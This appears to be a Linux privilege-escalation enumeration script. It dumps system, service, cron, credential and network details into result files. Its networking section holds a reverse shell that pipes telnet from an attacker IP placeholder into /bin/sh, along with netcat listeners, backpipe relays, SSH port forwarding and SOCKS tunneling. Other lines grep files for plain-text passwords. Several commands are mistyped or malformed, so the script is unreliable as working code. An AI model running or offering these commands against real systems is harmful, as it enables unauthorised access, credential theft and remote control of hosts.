#Basic Linux Privilege Escalation Script

{ echo $'###Operating System Information###' ;echo $'' ;echo $'##Distribution Type and Version##' ;echo $'' ;cat /etc/issue ;cat /etc/*-release ;echo $'' ;echo $'##Kernal Version and Bit Version##' ;echo $'' ;cat /proc/version ;uname -a ;uname -mrs ;rpm -q kernal ;dmesg | grep linux ;ls /boot | grep vmlinuz- ;echo $'' ;echo $'##Environmental Variables##' ;echo $'' ;cat /etc/profile ;cat /etc/bashrc ;cat ~/.bash_profile ;cat ~/.bashrc ;cat ~/.bash_logout ;env ;set ;echo $'' ;echo $'##Printer Information##' ;echo $'' ;lpstat-a ;} >~/bscripts/results/$(hostname)_os_info.txt

{ echo $'###Aplication & Services Information###' ;echo $'' ;echo $'##Services and Running As##' ;echo $'' ;ps aux ;ps -ef ;top ;cat /etc/services ;echo $'' ;echo $'##Services Running as Root and Which Are Vulnerable##' ;echo $'' ;ps aux | grep root ;ps -ef | grep root ;echo $'' ;echo $'##Installed Applications, Versions, and Running Status##' ;echo $'' ;ls -alh /usr/bin ;ls -alh /sbin ;dpkg -l ;rpm -qa ;ls -alh /var/cache/apt/archives0 ;ls -alh /var/cache/yum/ ;echo $'' ;echo $'##Misconfigured Service Settings and Vulnerable Plugins##' ;echo$'' ;cat /etc/syslog.conf ;cat /etc/chttp.conf ;cat /etc/lighttpd.conf ;cat /etc/cups/cupsd.conf ;cat /etc/inetd.conf ;cat /etc/apache2/apache2.conf ;cat /etc/my.conf ;cat /etc/my.conf ;cat /etc/httpd/conf/httpd.conf ;cat /opt/lampp/etc/https.conf ;ls -aRl /etc/ | awk '{echo $1}' ~ /^.*r.*/ ;echo $'' ;echo $'##Scheduled Jobs##' ;echo $'' ;crontab -l ;ls -alh /var/spool/cron ;ls -al /etc/ | grep cron ;ls -al /etc/cron* ;cat /etc/cron* /cat /etc/at.allow ;cat /etc/at.deny ;cat /etc/cron.allow ;cat /etc/cron.deny ;cat /etc/crontab ;cat /etc/anacrontab ;cat /var/spool/cron/crontabs/root ;echo $'' ;echo $'##Plain Text Usernames and Passwords##' ;echo $'' ;grep -i user [filename] ;grep -i pass [filename] ;grep -c 5 "password" [filename] ;find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" ;} >~/bscripts/results/$(hostname)_appsvc_info.txt

{ echo $'###Communication & Networking###' ;echo $'' ;echo $'##NIC(s) & Another Network Maybe##' ;echo $'' ;/sbin/ifconfig -a ;cat /etc/network/interfaces ;cat /etc/sysconfig/network ;echo $'' ;echo $'##Network Configuration Settings, Network Information, Any DHCP/DNS/Gateway Servers##' ;echo $'' ;cat /etc/resolv.conf ;cat /etc/sysconfig/network ;cat /etc/networks ;iptables -L ;hostname ;dnsdomainname ;echo $'' ;echo $'##Other Users & Hosts Communicating with System##' ;echo $'' ;lsof -i ;lsof -i :80 ;grep 80 /etc/services ;netstat -antup ;netstat -antpx ;netstat -tulpn ;chkconfig --list ;chkconfig --list | grep 3:on ;last ;w ;echo $'' ;echo $'##Any Cached IP or MAC Addresses##' ;echo $'' ;arp -e ;route ;/sbin/route -nee ;echo $'' ;echo $'##Is Packet Sniffing Possible, What Can Be  Seen, Listen to Live Traffic##' ;echo $'' ;tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 ;echo $'' ;echo $'##Do I Have Shell, Can I Interact with System##' ;echo $'' ;nc -lvp 4444 ;nc -lvp 4445 ;telnet [attackers ip] 44444 | /bin/sh | [local ip] 44445 ;echo $'' ;echo $'##Is Port Forwarding Possible, Redirect and Interact with Traffic from Another View##' ;echo $'' ;Fpipe.exe -l 80 -r 80 -s 80 192.168.1.7 ;ssh -L 8080:127.0.0.1:80 root@192.168.1.7 ;ssh -R 8080:127.0.0.1:80 root@192.168.1.7 ;mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe ;mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe ;mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe ;echo $'' ;echo '$##Is Tunneling Possible, Can I Send Commands Locally or Remotely##' ;echo $'' ;ssh -D 127.0.0.1:9050 -N [username]@[ip] ;proxychains ifconfig ;} >~/bscripts/results/$(hostname)_commnet_info.txt

